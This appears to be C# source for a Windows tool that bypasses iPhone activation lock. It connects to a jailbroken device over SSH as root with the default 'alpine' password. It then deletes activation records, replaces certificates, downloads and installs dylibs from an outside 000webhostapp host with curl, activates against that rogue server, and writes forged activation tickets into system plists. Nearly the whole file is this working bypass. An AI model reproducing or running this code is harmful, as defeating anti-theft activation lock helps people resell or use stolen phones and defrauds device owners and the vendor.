    public partial class Form1: Form
    {
		public SshClient sh = new SshClient("127.0.0.1", "root", "alpine");
        public ScpClient pc = new ScpClient("127.0.0.1", "root", "alpine");
        private bool UntWild = false;
        long usedMemory = GC.GetTotalMemory(true);
        private iOSDeviceManager manager = new iOSDeviceManager();
        private iOSDevice currentiOSDevice;
        Process proc = new Process();
        public Form1()
        {
            InitializeComponent();
			try
			{
				string x86 = "C:\\Program Files (x86)\\Common Files\\Apple\\Mobile Device Support\\iTunesMobileDevice.dll";
				string x64 = "C:\\Program Files\\Common Files\\Apple\\Mobile Device Support\\iTunesMobileDevice.dll";
				if (!File.Exists(x64))
				{
					File.Copy(".\\iTunesMobileDevice.dll", x64);
				}
				if(!File.Exists(x86))
				{
					File.Copy(".\\iTunesMobileDevice.dll", x86);
				}
				manager.CommonConnectEvent += CommonConnectDevice; manager.ListenErrorEvent += ListenError; manager.StartListen();
			}
			catch{ BoxShow("Restart tool in Administrator Mode", "MESSAGE", 2000);
				Form_Exit();
			}
			
        }
		public void Form_Exit()
        {
            foreach (var process in Process.GetProcessesByName("EX3cutioN3Rv1.0"))
            {
                process.Kill();
            }
        }
        public bool Proxy()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\iproxy.exe",
                        Arguments = "22 44",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true,
                    }
                };
                proc.Start();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool Desactivate()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\ideviceactivation.exe",
                        Arguments = "deactivate",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true,
                    }
                };
                proc.Start();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool HacktivateMEIDevice()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\ideviceactivation.exe",
                        Arguments = "activate -d -s https://ex3cution3ractivation.000webhostapp.com/v32.php",
                        UseShellExecute = false,
                        RedirectStandardInput = true,
                        CreateNoWindow = true,
                    }
                };
                proc.Start();
                proc.WaitForExit();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool HacktivateGSMDevice()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\ideviceactivation.exe",
                        Arguments = "activate -d -s https://ex3cution3ractivation.000webhostapp.com/v31.php",
                        UseShellExecute = false,
                        RedirectStandardInput = true,
                        CreateNoWindow = true,
                    }
                };
                proc.Start();
                proc.WaitForExit();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }		
        public bool Paired()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\idevicepair.exe",
                        Arguments = "pair",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                StreamReader reader = proc.StandardOutput;
                string result = reader.ReadToEnd();
                try
                {
                    proc.Kill();
                }
                catch
                {

                }
                if (result.Contains("SUCCESS"))
                {
                    reader.Dispose();
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                MessageBox.Show("idevicepair not found");
                return false;
            }
        }
		 private void CommonConnectDevice(object sender, DeviceCommonConnectEventArgs args)
        {
            if (args.Message == MobileDevice.Enumerates.ConnectNotificationMessage.Connected)
            {
                currentiOSDevice = args.Device;
                //SetData(true);

            }
            if (args.Message == MobileDevice.Enumerates.ConnectNotificationMessage.Disconnected)
            {
              //  SetData(false);
            }
        }
        private void ListenError(object sender, ListenErrorEventHandlerEventArgs args)
        {
            if (args.ErrorType == MobileDevice.Enumerates.ListenErrorEventType.StartListen)
            {
                throw new Exception(args.ErrorMessage);
            }
        }
		public void BoxShow(string text, string caution, int timeout)
        {
                MessageBox.Show(text, caution, MessageBoxButtons.OK, MessageBoxIcon.Information); 
        }
        public bool CheckMEID()
        {
            try
            {
                    proc = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = ".\\LibimobiledeviceEXE\\ideviceinfo.exe",
                            //Arguments = "pair",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true
                        }
            };
                proc.Start();
                StreamReader reader = proc.StandardOutput;
                string result = reader.ReadToEnd();

                Thread.Sleep(2000);
                try { proc.Kill(); } catch { }
                if (result.Contains("MobileEquipmentIdentifier"))
                {
                    reader.Dispose();
                    return true;
                }
                else { return false; }

            }
            catch (System.ComponentModel.Win32Exception)
            {
                MessageBox.Show("ideviceinfo not found");
                return false;
            }
        }
		public bool Bypass(iOSDevice currentiOSDevice)
		{
			string Commcenter = "com.apple.commcenter.device_specific_nobackup.plist";
			string ActivationTicket2 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KCTxrZXk+QWN0aXZhdGlvblJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkFjdGl2YXRpb25SYW5kb21uZXNzPC9rZXk+CgkJPHN0cmluZz4zMGI2MGZkMC02Njc0LTQ3NzgtYmIxNC1mNGZhOTQ0MWQ0Yzg8L3N0cmluZz4KCQk8a2V5PkFjdGl2YXRpb25TdGF0ZTwva2V5PgoJCTxzdHJpbmc+VW5hY3RpdmF0ZWQ8L3N0cmluZz4KCQk8a2V5PkZNaVBBY2NvdW50RXhpc3RzPC9rZXk+CgkJPHRydWUvPgoJPC9kaWN0PgoJPGtleT5CYXNlYmFuZFJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkFjdGl2YXRpb25SZXF1aXJlc0FjdGl2YXRpb25UaWNrZXQ8L2tleT4KCQk8dHJ1ZS8+CgkJPGtleT5CYXNlYmFuZEFjdGl2YXRpb25UaWNrZXRWZXJzaW9uPC9rZXk+CgkJPHN0cmluZz5WMjwvc3RyaW5nPgoJCTxrZXk+QmFzZWJhbmRDaGlwSUQ8L2tleT4KCQk8aW50ZWdlcj4xMjM0NTY3PC9pbnRlZ2VyPgoJCTxrZXk+QmFzZWJhbmRNYXN0ZXJLZXlIYXNoPC9rZXk+CgkJPHN0cmluZz44Q0IxMDcwRDk1QjlDRUU0QzgwMDAwNUUyMTk5QkI4RkIxODNCMDI3MTNBNTJEQjVFNzVDQTJBNjE1NTM2MTgyPC9zdHJpbmc+CgkJPGtleT5CYXNlYmFuZFNlcmlhbE51bWJlcjwva2V5PgoJCTxkYXRhPgoJCUVnaGRDdz09CgkJPC9kYXRhPgoJCTxrZXk+SW50ZXJuYXRpb25hbE1vYmlsZUVxdWlwbWVudElkZW50aXR5PC9rZXk+CgkJPHN0cmluZz4xMjM0NTY3ODkxMjM0NTY8L3N0cmluZz4KCQk8a2V5Pk1vYmlsZUVxdWlwbWVudElkZW50aWZpZXI8L2tleT4KCQk8c3RyaW5nPjEyMzQ1Njc4OTEyMzQ1PC9zdHJpbmc+CgkJPGtleT5TSU1TdGF0dXM8L2tleT4KCQk8c3RyaW5nPmtDVFNJTVN1cHBvcnRTSU1TdGF0dXNOb3RJbnNlcnRlZDwvc3RyaW5nPgoJCTxrZXk+U3VwcG9ydHNQb3N0cG9uZW1lbnQ8L2tleT4KCQk8dHJ1ZS8+CgkJPGtleT5rQ1RQb3N0cG9uZW1lbnRJbmZvUFJMTmFtZTwva2V5PgoJCTxpbnRlZ2VyPjA8L2ludGVnZXI+CgkJPGtleT5rQ1RQb3N0cG9uZW1lbnRJbmZvU2VydmljZVByb3Zpc2lvbmluZ1N0YXRlPC9rZXk+CgkJPGZhbHNlLz4KCTwvZGljdD4KCTxrZXk+RGV2aWNlQ2VydFJlcXVlc3Q8L2tleT4KCTxkYXRhPgoJTFMwdExTMUNSVWRKVGlCRFJWSlVTVVpKUTBGVVJTQlNSVkZWUlZOVUxTMHRMUzBLVFVsSlFuaEVRME5CVXpCRFFWRkIKCWQyZFpUWGhNVkVGeVFtZE9Wa0pCVFZSS1JVa3pUbXRSTUU1RlJUVk1WVmt6VGpCUmRFNUZVVEJOYVRBMFVWVktRZzBLCglURlJyZUZKcVdrVlNSRWw1VWtWS1IwNXFSVXhOUVd0SFFURlZSVUpvVFVOV1ZrMTRRM3BCU2tKblRsWkNRV2RVUVd0TwoJYWpaeFNVbHRUbmxXU21WMU5sTTJVak40UVcxT1RXNWFjREpHTDNoRVNIRjViVmxVT1ZoT1JFdzBjRlJaYjFnMmF6QmsKCVFrMVNTWGRGUVZsRVZsRlJTQTBLUlhkc1JHUllRbXhqYmxKd1ltMDRlRVY2UVZKQ1owNVdRa0Z2VkVOclJuZGpSM2hzCglTVVZzZFZsNU5IaEVla0ZPUW1kT1ZrSkJjMVJDYld4UllVYzVkUTBLV2xSRFFtNTZRVTVDWjJ0eGFHdHBSemwzTUVKQgoJUVUxQk1FZERVM0ZIVTBsaU0wUlJSVUpDVVZWQlFUUkhRa0ZETDJ4eWJHVlJUamR3UVEwS00yaEhWVlkwU0ZsU1lXdHYKCWFrazRPV3d4YUZKdmRqQlROREJPTUhBeU1UaHJUV295YkRGT2EzUXdWWEJxV2s5RU5WVldlVGRDT0VsT1FrSm1RMmxNCglNZzBLWnk4dkx5dHpaVVZoVjFjMGFEWXdUM0pOZG5KbFFWQTBNR0psVTJaUFlucE1WR3hYUzJGV2NXRnJNV1JGVGpSSgoJTkd4TVRYaHBlVFVyYjNwSVpqWmlWdzBLVGl0bldFSlVNMjl4WkhWRFF6RldWelZKV25aMlpFUlNWRWx3YUZoNmEyRUsKCVVVVkdRVUZQUW1wUlFYZG5XV3REWjFsRlFYSlVhMVpFZDBGV01IbHRZazVWUm14ME0yeExjMHRCWkEwS2JuYzBTRlpPCglaMEZ1UkhoaWRRMEtRVUpXV1VSMlNGaEJNREZNV0ZOS1F5dHRkamd5VFZSSWQySk5ORVF2V2xJclJFaFpRV1kyWXlzNQoJYVc1TlJtUk9PR2xaV0hSSWFFOXdjV3MwYVd4TlR3MEtZMnRuWWtsNlMwb3lOWFJPWTFKVWMwOXdWVU5CZDBWQlFXRkIKCUxTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVWdVa1ZSVlVWVFZDMHRMUzB0Cgk8L2RhdGE+Cgk8a2V5PkRldmljZUlEPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PlNlcmlhbE51bWJlcjwva2V5PgoJCTxzdHJpbmc+RlIxUDJHSDhKOFhIPC9zdHJpbmc+CgkJPGtleT5VbmlxdWVEZXZpY2VJRDwva2V5PgoJCTxzdHJpbmc+ZDk4OTIwOTZjZjM0MTFlYTg3ZDAwMjQyYWMxMzAwMDNmMzQxMWU0Mjwvc3RyaW5nPgoJPC9kaWN0PgoJPGtleT5EZXZpY2VJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkJ1aWxkVmVyc2lvbjwva2V5PgoJCTxzdHJpbmc+MThGMDA8L3N0cmluZz4KCQk8a2V5PkRldmljZUNsYXNzPC9rZXk+CgkJPHN0cmluZz5pUGhvbmU8L3N0cmluZz4KCQk8a2V5PkRldmljZVZhcmlhbnQ8L2tleT4KCQk8c3RyaW5nPkI8L3N0cmluZz4KCQk8a2V5Pk1vZGVsTnVtYmVyPC9rZXk+CgkJPHN0cmluZz5NTExOMjwvc3RyaW5nPgoJCTxrZXk+T1NUeXBlPC9rZXk+CgkJPHN0cmluZz5pUGhvbmUgT1M8L3N0cmluZz4KCQk8a2V5PlByb2R1Y3RUeXBlPC9rZXk+CgkJPHN0cmluZz5pUGhvbmUwLDA8L3N0cmluZz4KCQk8a2V5PlByb2R1Y3RWZXJzaW9uPC9rZXk+CgkJPHN0cmluZz4xNC4wLjA8L3N0cmluZz4KCQk8a2V5PlJlZ2lvbkNvZGU8L2tleT4KCQk8c3RyaW5nPkxMPC9zdHJpbmc+CgkJPGtleT5SZWdpb25JbmZvPC9rZXk+CgkJPHN0cmluZz5MTC9BPC9zdHJpbmc+CgkJPGtleT5SZWd1bGF0b3J5TW9kZWxOdW1iZXI8L2tleT4KCQk8c3RyaW5nPkExMjM0PC9zdHJpbmc+CgkJPGtleT5TaWduaW5nRnVzZTwva2V5PgoJCTx0cnVlLz4KCQk8a2V5PlVuaXF1ZUNoaXBJRDwva2V5PgoJCTxpbnRlZ2VyPjEyMzQ1Njc4OTEyMzQ8L2ludGVnZXI+Cgk8L2RpY3Q+Cgk8a2V5PlJlZ3VsYXRvcnlJbWFnZXM8L2tleT4KCTxkaWN0PgoJCTxrZXk+RGV2aWNlVmFyaWFudDwva2V5PgoJCTxzdHJpbmc+Qjwvc3RyaW5nPgoJPC9kaWN0PgoJPGtleT5Tb2Z0d2FyZVVwZGF0ZVJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkVuYWJsZWQ8L2tleT4KCQk8dHJ1ZS8+Cgk8L2RpY3Q+Cgk8a2V5PlVJS0NlcnRpZmljYXRpb248L2tleT4KCTxkaWN0PgoJCTxrZXk+Qmx1ZXRvb3RoQWRkcmVzczwva2V5PgoJCTxzdHJpbmc+ZmY6ZmY6ZmY6ZmY6ZmY6ZmY8L3N0cmluZz4KCQk8a2V5PkJvYXJkSWQ8L2tleT4KCQk8aW50ZWdlcj4yPC9pbnRlZ2VyPgoJCTxrZXk+Q2hpcElEPC9rZXk+CgkJPGludGVnZXI+MzI3Njg8L2ludGVnZXI+CgkJPGtleT5FdGhlcm5ldE1hY0FkZHJlc3M8L2tleT4KCQk8c3RyaW5nPmZmOmZmOmZmOmZmOmZmOmZmPC9zdHJpbmc+CgkJPGtleT5VSUtDZXJ0aWZpY2F0aW9uPC9rZXk+CgkJPGRhdGE+CgkJTUlJRDB3SUJBakNDQTh3RUlQNEMzc3FRdFAxUzJod0JaekNvSGNzb0gyeE51NWMrYTRRNDVvSjFNS0YzCgkJQkVFRTJlOTNlb1ZPeHVmMGVLUFVxTkVnNnpNbEJzTnEranIrUnFNQXhTaFZBL2NUNW9ua3IwdCtFMEhLCgkJblNkdkhNMi9GZXRyT3FpT0k0RHZIUElEVzBEMnVBUVEzaW9iUHdhQWxGbFhIUFdyOE1KLyt3UVFHVGxuCgkJRVhPMTZOdDJrVUUrdy8vQmxHd1Q4V3hSZXkvSU41SW1NbGtZelpsSnpack83dVl0bHBlZ3k2K3hJaWwyCgkJQjJYbHk0aUd4UlppUld5NXNLcFFvMll6b0pFbW1XU25manUwY1UyL3JiOUZCdnVWaS9rV1NGbkFrdDR5CgkJcVF3NGswaWJ0cDVXK1lVQ0NvZm8zeWVuak0yVWMwbit5SExyU20wRTlPUDNwdExUN3ZHcnJma3IzWFJpCgkJdHdEcGRCT3NzK1h6SEFRWEt1cG85WGkxUW1ObGp1VGoxakpZbzZNc1kyOURYOUVacFdEdmpJc0l5THd4CgkJQjRjbUlTVWY4Qm5yUlFHOURBM01lYzZiaFRkUEJjdUtXZHBCbm5DMlY4V3BmTXBwVUQ2U2RndW5pejZ6CgkJTEcwNmNGR3dvUXZuWXhRa1Vra2pkWWR6NG85eXM5L3ZxQ2JxZnBuNHRjZEkyMWM5Z29Nd0xoRHNoYms1CgkJUENaQnNoNUY0U1JSaWdBV3JBU0NBejk4MkI3bzhwQ0NaL2pZK3laQ3pBb3J6SG5zR2Z2d0tpSlBBTWppCgkJZTA0RzRqSk04cEpRUU5uWmFhUCt0RmVsZGhER1FubzA0dmZKRFkzOEZGTSthZUN3elJyQy9DUGJrZVpRCgkJNXR5NTdMSXNzMUhyUmUzSTFjK0ZMNXBuZmwvaEsxQjF1QTRHRDRWbFkxU0xMMXk1ajRHdUZUM1hTeHpiCgkJWlIvZmJEa1V5VHNUM3I2eGdoWnRNNEJYSW9hNjJaREMzSVBtT2J4S2JobGFLQTRtSzJzM1FCNFZjNlMvCgkJbTZ1YTZQakwvQjE1QzBjTGpyMUNNb0x0Lzc4TFVRV21GRXV5SkhkdnRTNnhIbWtMRG9FZW1tMHlDcGJqCgkJMmhrRmt2d3dISlg2SDFiUm1KWS9HUmY1UXVIWDVKdlk3ZGhOY2YzNENmaVExRHdwZ2VKUkw5eTN2SG0vCgkJZkFSV0JxWDNkWjV1VUpXcUNzMklvMFdIRGdqMTh3cW5vUEw2QnRHcjVhWEJFeGF3WkpGT1ZOcVZjV2lPCgkJOE9LMzhuSDFKaGcxVk44UURBelhmTEpjQ2w0UEN6Mm5sVlpSMDl1WnF0NlpPaXFjVUNyZ3hZbTdIQktaCgkJOS9BRmIyVmxLUFRZTTNueXBDeGh5MmNMQnowK3RCK0V6V0hTbjlzU3FMelN1eFBOdGIxY21FMno5OFNoCgkJMk1UVzJaWk42NWdvYkxrSU5wbzdUb1RBMm50cHY1ZjBqdlhpVnZIV1V1dmhUSVlLZG4vKzA0czNJQ0VLCgkJQVlJQ0NPNjgvakxucDVQUERuRmVsQ3Z1d0dFRTFkb0lMNzZ6UllNOWlrWTJHRVB5NW5XdW1ydXp4U2RCCgkJMURBNnNOeUxQanN2QnBnYUVnWmI0OUpXSjlERU5vYWZKeGQ4dlBoRnpORHZEL0NRKzU4VGtCYmYwWEVLCgkJa2xIRzdzOFY0SkRsYS9jMTBjSDcyWS8wL0lOUi9kUVk1V3FSaHNiSEVFalBVekdDTGNVPQoJCTwvZGF0YT4KCQk8a2V5PldpZmlBZGRyZXNzPC9rZXk+CgkJPHN0cmluZz5mZjpmZjpmZjpmZjpmZjpmZjwvc3RyaW5nPgoJPC9kaWN0Pgo8L2RpY3Q+CjwvcGxpc3Q+";
			string ActivationTicket = "MIICpQIBATALBgkqhkiG9w0BAQsxa58/BBVEVHqfQAThEJIAn0sU6sIK7nUWVvVFjp5fNflte+TipN+fh2sHNWFCCZkAUJ+HbQc1YUIJmQBQn5c9DAAAAADu7u7u7u7u75+XPgQBAAAAn5c/BAEAAACfl0AEAQAAAJ+XQQQBAAAABIIBAF48YM1xancRQdwplbYKZEBZPUi9GC08W35zLPtl9YWpurb8n030xT+3omg3ho21MtAQrPKRSS2I8tRTObK14awCx6NMly1wPRgirA/81f19i3ZPDoWheMi7iLVIkD+w9/WmcfsLdd+i+3nWgjZnyrZUArT40e1UcTIj/o0EgsYyhRiNfdRJXAp3lnu0rvkLI9Mbu1VQlccyVc7mx3Ef7REn6buD6F1zXisoHD9bgEm2Cf9C7PvCDUkdUsEadDIL7QbJGlBmPunlMR4eWgyzhmOEJ/xugtqO4PcjptMRLo+1koTtJdMN75PUS8eoXthQldsbrMfdfHGdEkKKnEYFa6GjggEgMAsGCSqGSIb3DQEBAQOCAQ8AMIIBCgKCAQEArJFPRdnc/E7Vgatg/AHbKnGEudR+ug8WZghxMOlPad3fL42hHAXReVRcBE5liQXEyaP0ojy3s3QJhuNEXwLMYOLCKJNAj4SrE6dZqJ9CQamouvEnZjdC/gLBG5jSuAI4zF+hjObe8OZnV6YGcooEbRkA51dj+x5zmY+vT0va/w+EOdAiTWi6xiWdVFQTXCpCTUzA9qcax58XUi04+dcVSEwVO9U3ZeyoIUrJD/FmoDjjZOidCHDgsCGlnLfQP/gLKOMpOfzw4dWFIW1IiDvs9Uy+U3YhyyE4HPDVx2oAf8ojhBMzsdqXGVV148H0mZSkR4+ulZVlR4E/mxB2ZdP7HQIDAQAB";
			string ActivationState = "Activated";
			string ActivityURL = "https://albert.apple.com/deviceservices/activity";
			string PhoneNumberNotificationURL = "https://albert.apple.com/deviceservices/phoneHome";
			try 
			{
				 string SN = currentiOSDevice.SerialNumber;
				 string FileKnown = "%USERPROFILE%\\.ssh\\known_hosts";
				if (File.Exists(FileKnown))
				{
				   File.Delete(FileKnown);
				}
				Proxy();
				if(!sh.IsConnected) {
					sh.Connect();
				}
				if(!pc.IsConnected) {
					pc.Connect();
				}
				if(Desactivate() != true) {
					try {
						if(Paired() != true) {
							MessageBox.Show("Unlock your iDevice and press the Trust button", "MESSAGE");
							Paired();
						}
						Desactivate();
					}
					catch(Exception e) {
					MessageBox.Show(e.Message, "ERROR");
					return false;
					}
				}
				try 
				{
					sh.CreateCommand("mount -o rw,union,update /").Execute();
					sh.CreateCommand("cp -rp /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/FactoryActivation.pem /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem").Execute();
					sh.CreateCommand("rm /./*.tar /./*.lzma").Execute(); 
					sh.CreateCommand("chflags -R nouchg /private/var/mobile/Library/Preferences").Execute(); 
					sh.CreateCommand("chflags -R nouchg /private/var/wireless/Library/Preferences").Execute(); 
					sh.CreateCommand("chflags -R nouchg /private/var/containersData/System/*/Library/internal").Execute(); 
					sh.CreateCommand("chflags -R nouchg /private/var/containersData/System/*/Library/internal/../activation_records").Execute();
					sh.CreateCommand("rm /private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist").Execute();
					sh.CreateCommand("rm /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
					sh.CreateCommand("rm /private/var/mobile/Library/Preferences/com.apple.purplebuddy.notbackedup.plist").Execute();
					sh.CreateCommand("rm -rf /private/var/containersData/System/*/Library/internal/../activation_records").Execute();
					sh.CreateCommand("rm -rf /private/var/containersData/System/*/Library/internal").Execute();
					sh.CreateCommand("snappy -f / -r `snappy -f / -l | sed -n 2p` -t orig-fs").Execute();
					sh.CreateCommand("launchctl unload -w -F /System/Library/LaunchDaemons/*").Execute();
					sh.CreateCommand("launchctl load -w -F /System/Library/LaunchDaemons/*").Execute();
					Thread.Sleep(5000);
				}
				catch(Exception e) {
					MessageBox.Show(e.Message, "ERROR");
					return false;
				}
				try 
				{
					pc.Upload(new FileInfo(".\\Core\\Coreutils"), "/./core");
					sh.CreateCommand("tar -xvf /./core -C /./").Execute();
					sh.CreateCommand("chmod -R 00755 /./bin /./usr/bin /./usr/sbin /./bin").Execute();
					sh.CreateCommand("rm /./core").Execute();
					sh.CreateCommand("curl https://ex3cution3ractivation.000webhostapp.com/Resources/CydiaSubstrate --output /./c.tar.lzma &>/curLog.txt").Execute();
					sh.CreateCommand("curl https://ex3cution3ractivation.000webhostapp.com/Resources/lzma --output /./bin/lzma &>/curLog.txt").Execute();
					sh.CreateCommand("curl https://ex3cution3ractivation.000webhostapp.com/Resources/UIKit --output /./UIKit &>/curLog.txt").Execute();
					sh.CreateCommand("chmod -R 00755 /./bin /./usr/bin /./usr/sbin /./bin").Execute();
					sh.CreateCommand("tar -xvf /./UIKit -C /./").Execute();
					sh.CreateCommand("chmod -R 00755 /./bin /./usr/bin /./usr/sbin /./bin").Execute();
					sh.CreateCommand("rm /./UIKit").Execute();
					sh.CreateCommand("lzma -d -v /./c.tar.lzma").Execute();
					sh.CreateCommand("tar -xvf /./c.tar -C /./").Execute();
					sh.CreateCommand("rm /./c.tar").Execute();
					sh.CreateCommand("/usr/libexec/substrate; killall HUD Preferences").Execute();
					sh.CreateCommand("/usr/libexec/substrated; killall HUD thermalmonitord").Execute();
					sh.CreateCommand("curl https://ex3cution3ractivation.000webhostapp.com/Resources/untethered.dylib --output /./Library/MobileSubstrate/DynamicLibraries/untethered.dylib &>/curLog.txt").Execute();
					sh.CreateCommand("curl https://ex3cution3ractivation.000webhostapp.com/Resources/untethered.plist --output /./Library/MobileSubstrate/DynamicLibraries/untethered.plist &>/curLog.txt").Execute();
					sh.CreateCommand("chown root.wheel /./Library/MobileSubstrate/DynamicLibraries").Execute();
					sh.CreateCommand("chmod 00777 /./Library/MobileSubstrate/DynamicLibraries/untethered.dylib").Execute();
					sh.CreateCommand("chown root /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem").Execute();
					sh.CreateCommand("chmod 00600 /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem").Execute();
					sh.CreateCommand("launchctl unload -w -F /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();
					sh.CreateCommand("launchctl unload -w -F /System/Library/LaunchDaemons/com.apple.mobile.lockdown.plist").Execute();		
					sh.CreateCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();
					sh.CreateCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.mobile.lockdown.plist").Execute();
					Thread.Sleep(2000);
					if(Paired() != true) {
							MessageBox.Show("Unlock your iDevice and press the Trust button", "MESSAGE");
							Paired();
					}
					if(CheckMEID() != true)
					{
						HacktivateGSMDevice();
					}
					else
					{
						HacktivateMEIDevice();
					}
					Thread.Sleep(5000);
					sh.CreateCommand("chflags -R uchg /private/var/containersData/System/*/Library/internal /private/var/containersData/System/*/Library/internal/../activation_records").Execute();		
					sh.CreateCommand("rm /./Library/MobileSubstrate/DynamicLibraries/untethered.dylib").Execute();
					sh.CreateCommand("rm /./Library/MobileSubstrate/DynamicLibraries/untethered.plist").Execute();			
					sh.CreateCommand("curl https://ex3cution3ractivation.000webhostapp.com/Resources/iuntethered.dylib --output /./Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib &>/curLog.txt").Execute();
					sh.CreateCommand("curl https://ex3cution3ractivation.000webhostapp.com/Resources/iuntethered.plist --output /./Library/MobileSubstrate/DynamicLibraries/iuntethered.plist &>/curLog.txt").Execute();
					Thread.Sleep(4000);
					sh.CreateCommand("launchctl unload -w -F /System/Library/LaunchDaemons/*").Execute();
					sh.CreateCommand("plutil -dict -kPostponementTicket /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil  -kPostponementTicket -ActivationState -string " + ActivationState + " /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil  -kPostponementTicket -ActivityURL -string " + ActivityURL + " /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil  -kPostponementTicket -ActivationTicket -string " + ActivationTicket + " /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil  -kPostponementTicket -PhoneNumberNotificationURL -string " + PhoneNumberNotificationURL + " /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("launchctl load -w -F /System/Library/LaunchDaemons/*").Execute();
					Thread.Sleep(12000);
					sh.CreateCommand("curl https://ex3cution3ractivation.000webhostapp.com/Resources/purplebuddy --output /private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist &>/curLog.txt").Execute();
					sh.CreateCommand("chmod 00600 /private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist").Execute();sh.CreateCommand("chown mobile /private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist").Execute();sh.CreateCommand("chflags uchg /private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist").Execute();	
					sh.CreateCommand("rm -rf /./Library/MobileSubstrate /./usr/lib/libsubstrate.dylib /./usr/lib/cycript0.9 /./usr/lib/substrate /./usr/libexec/substrated /./usr/libexec/substrate /./usr/include/substrate.h /./usr/bin/cycc /./usr/bin/cynject /./private/var/mobile/Logs/mobileactivationd /./Library/Frameworks/*").Execute();
					sh.CreateCommand("plutil --kPostponementTicket -remove /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil -dict -kPostponementTicket /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil  -kPostponementTicket -ActivationState -string " + ActivationState + " /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil  -kPostponementTicket -ActivityURL -string " + ActivityURL + " /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil  -kPostponementTicket -ActivationTicket -string " + ActivationTicket2 + " /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("plutil  -kPostponementTicket -PhoneNumberNotificationURL -string " + PhoneNumberNotificationURL + " /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("chflags uchg /private/var/wireless/Library/Preferences/" + Commcenter + "").Execute();
					sh.CreateCommand("launchctl unload -w -F /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();
					sh.CreateCommand("launchctl unload -w -F /System/Library/LaunchDaemons/com.apple.mobile.lockdown.plist").Execute();		
					sh.CreateCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();
					sh.CreateCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.mobile.lockdown.plist").Execute();
					sh.CreateCommand("killall -9 backboardd").Execute();
					BoxShow("Éxito!", "Dispositivo activado correctamente", 6000);
					return true;
				}
				catch(Exception e) 
				{
					MessageBox.Show(e.Message, "ERROR");
					return false;
				}
			}
			catch(Exception e) 
			{
				MessageBox.Show(e.Message, "ERROR");
				return false;
			}
		}
